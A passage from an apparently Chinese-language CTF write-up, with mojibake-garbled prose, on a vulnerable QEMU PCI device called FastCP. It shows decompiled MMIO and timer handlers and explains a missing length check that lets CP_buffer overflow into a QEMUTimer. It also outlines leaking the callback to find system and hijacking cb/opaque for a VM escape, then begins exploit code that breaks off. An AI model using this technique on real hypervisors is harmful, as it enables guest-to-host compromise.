class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å°±æ˜¯writeå‡½æ•°ï¼Œå¯ä»¥ä¿®æ”¹<code>opaque-&gt;cp_state.cmd</code>ã€<code>opaque-&gt;cp_state.CP_list_cnt</code>ã€<code>opaque-&gt;cp_state.CP_list_src</code>ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°ä¸­é—´ä¼šè§¦å‘timerã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> CP_list_cnt; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v8; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdx</span></span><br><span class="line">  FastCP_CP_INFO cp_info; <span class="comment">// [rsp+0h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;cp_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(cp_info));</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);<span class="comment">// read</span></span><br><span class="line">        <span class="keyword">if</span> ( cp_info.CP_cnt &lt;= <span class="number">0x1000</span> )</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      v7 = opaque-&gt;cp_state.CP_list_cnt == <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">        cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);<span class="comment">// write</span></span><br><span class="line">        v6 = opaque-&gt;cp_state.cmd &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">LABEL_11:</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">          <span class="keyword">if</span> ( msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            msi_notify(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">      CP_list_cnt = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">      opaque-&gt;handling = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( CP_list_cnt &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">3</span> * v8++;</span><br><span class="line">          cpu_physical_memory_rw(opaque-&gt;cp_state.CP_list_src + <span class="number">8</span> * v9, &amp;cp_info, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_src, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">0</span>);</span><br><span class="line">          cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( opaque-&gt;cp_state.CP_list_cnt &gt; v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !CP_list_cnt )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">          v6 = cmd &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">          opaque-&gt;cp_state.cmd = v6;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        v4 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          cpu_physical_memory_rw(v3 + opaque-&gt;cp_state.CP_list_src, buf, <span class="number">0x18</span>uLL, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v12 &gt; <span class="number">0x1000</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">          ++v4;</span><br><span class="line">          v3 += <span class="number">24LL</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v4 &gt;= v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !v5 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cmd = opaque-&gt;cp_state.cmd;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;cp_state.cmd = <span class="number">0LL</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">  opaque-&gt;handling = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨timerä¸­å­˜åœ¨ä¸‰ä¸ªç”±cmdå±æ€§æ§åˆ¶çš„åˆ†æ”¯ï¼Œè¿™é‡Œç›´æ¥è¯´ä¸‰ä¸ªåˆ†æ”¯çš„åŠŸèƒ½ï¼š</p><ol><li>  <code>opaque-&gt;cp_state.cmd = 2</code>; ä»<code>opaque-&gt;cp_state.CP_list_src</code>è¯»å–å†…å®¹åˆ°æ ˆä¸Šï¼Œé€šè¿‡<code>( cp_info.CP_cnt &lt;= 0x1000 )</code>éªŒè¯ä¹‹åå†å°†<code>cp_info.CP_src</code>å†…å®¹è¯»å–åˆ°<code>opaque-&gt;CP_buffer</code>ä¸Šã€‚</li><li>  <code>opaque-&gt;cp_state.cmd = 4</code>; ä»<code>opaque-&gt;cp_state.CP_list_src</code>è¯»å–å†…å®¹åˆ°æ ˆä¸Šï¼Œæœªé€šè¿‡ä»»ä½•éªŒè¯ï¼Œç›´æ¥å°†<code>opaque-&gt;CP_buffer</code>å†™åˆ°<code>cp_info.CP_dst</code>ä¸Š</li><li>  <code>opaque-&gt;cp_state.cmd = 1</code>; ä»<code>opaque-&gt;cp_state.CP_list_src + 8 * v9</code>è¯»å–å†…å®¹åˆ°æ ˆä¸Šï¼Œæœªé€šè¿‡ä»»ä½•éªŒè¯ï¼Œå°†<code>cp_info.CP_src</code>è¯»å–åˆ°<code>opaque-&gt;CP_buffer</code>ä¸Šï¼Œå†å°†<code>opaque-&gt;CP_buffer</code>å†™åˆ°<code>cp_info.CP_dst</code>ä¸Šã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> FastCPState struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1A30</span>, align=<span class="number">0x10</span>, copyof_4530)</span><br><span class="line"><span class="number">00000000</span> pdev PCIDevice_0 ?</span><br><span class="line"><span class="number">000008F</span>0 mmio MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009E0</span> cp_state CP_state ?</span><br><span class="line"><span class="number">000009F</span>8 handling db ?</span><br><span class="line"><span class="number">000009F</span>9 db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>A db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>B db ? ; undefined</span><br><span class="line"><span class="number">000009F</span>C irq_status dd ?</span><br><span class="line"><span class="number">00000</span>A00 CP_buffer db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001</span>A00 cp_timer QEMUTimer_0 ?</span><br><span class="line"><span class="number">00001</span>A30 FastCPState ends</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="number">00000000</span> QEMUTimer_0 struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1181)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: FastCPState/r</span><br><span class="line"><span class="number">00000000</span> expire_time dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list dq ?                         ; offset</span><br><span class="line"><span class="number">00000010</span> cb dq ?                                 ; offset</span><br><span class="line"><span class="number">00000018</span> opaque dq ?                             ; offset</span><br><span class="line"><span class="number">00000020</span> next dq ?                               ; offset</span><br><span class="line"><span class="number">00000028</span> attributes dd ?</span><br><span class="line"><span class="number">0000002</span>C scale dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0 ends</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šè¿°ç»“æ„ä½“å†åŠ ä¸Šä¸Šé¢çš„åˆ†æç»“æœæ¼æ´å·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ã€‚å› ä¸ºæƒ…å†µ2å’Œ3ä¸­æ²¡æœ‰å¯¹lenè¿›è¡ŒéªŒè¯å¯¼è‡´å¯ä»¥è¶Šç•Œä½¿ç”¨ç»“æ„ä½“äº§ç”Ÿçš„æ¼æ´ã€‚</p><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>å› ä¸ºæ¼æ´ç‚¹è¾ƒä¸ºç®€å•ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•</p><ol><li>  é¦–å…ˆé€šè¿‡æƒ…å†µ2è¶Šç•Œè¯»å–åˆ°<code>cp_timer</code>æˆå‘˜ä¸­çš„å†…å®¹ã€‚è¯¥æˆå‘˜ä¸­cbçš„å€¼ä¸º<code>fastcp_cp_timer</code>å‡½æ•°çš„åœ°å€(åœ¨<code>pci_FastCP_realize</code>ä¸­å®Œæˆèµ‹å€¼)ï¼Œè¿›è€Œæ³„æ¼å‡ºsystemçš„åœ°å€ã€‚é¡ºä¾¿æ³„æ¼å‡ºopaqueæˆå‘˜åœ°å€ã€‚</li><li>  é€šè¿‡æƒ…å†µ3è¶Šç•Œå†™å…¥å†…å®¹åˆ°<code>cp_timer</code>æˆå‘˜ï¼ŒåŠ«æŒcbå’Œopaqueã€‚</li><li>  æœ€åè§¦å‘timerå®Œæˆåˆ©ç”¨</li></ol><h4 id="æ³¨æ„ï¼ï¼"><a href="#æ³¨æ„ï¼ï¼" class="headerlink" title="æ³¨æ„ï¼ï¼"></a><strong>æ³¨æ„ï¼ï¼</strong></h4><p><strong>è™½ç„¶åˆ©ç”¨æ–¹å¼ç‰¹åˆ«ç®€å•ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®æœ‰ä¸€ç‚¹æ˜¯éå¸¸å®¹æ˜“è¢«å¿½ç•¥çš„ã€‚é‚£å°±æ˜¯ç‰©ç†åœ°å€è¿ç»­ä¸ä»£è¡¨è™šæ‹Ÿåœ°å€è¿ç»­ï¼</strong></p><p>åœ¨ä¸‹é¢expä¸­ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¯»å–åˆ°<code>cp_timer</code>æˆå‘˜åˆ°å†…å®¹åå¹¶æ²¡æœ‰ä½¿ç”¨<code>*(unsigned long long *)(userbuf + 0x1010)</code>æ¥è¯»å–ï¼Œå› ä¸ºç¨‹åºä¸­å®é™…å†™å…¥åˆ°å‡½æ•°æ˜¯<code>cpu_physical_memory_rw(cp_info.CP_dst, opaque-&gt;CP_buffer, cp_info.CP_cnt, 1);</code>è€Œè¿™é‡Œå†™å…¥åˆ°çš„æ˜¯ç‰©ç†åœ°å€ï¼Œä½†æ˜¯ç‰©ç†åœ°å€å¹¶ä¸è¿ç»­ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯è¯»å–ä¸åˆ°çš„ã€‚æ‰€ä»¥æœ€åå¾€<code>cp_timer</code>æˆå‘˜å†™å…¥çš„æ—¶å€™ä½¿ç”¨çš„ä¹Ÿæ˜¯<code>va2pa(userbuf + 0x1000) - 0x1000</code>å†™å…¥ã€‚</p><h3 id="ç»¼ä¸Šï¼Œexp"><a href="#ç»¼ä¸Šï¼Œexp" class="headerlink" title="ç»¼ä¸Šï¼Œexp"></a>ç»¼ä¸Šï¼Œexp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCP_CP_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> CP_src;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_cnt;</span><br><span class="line">    <span class="keyword">uint64_t</span> CP_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> expire_time;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> timer_list;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">    <span class="keyword">char</span> command[<span class="number">0x50</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 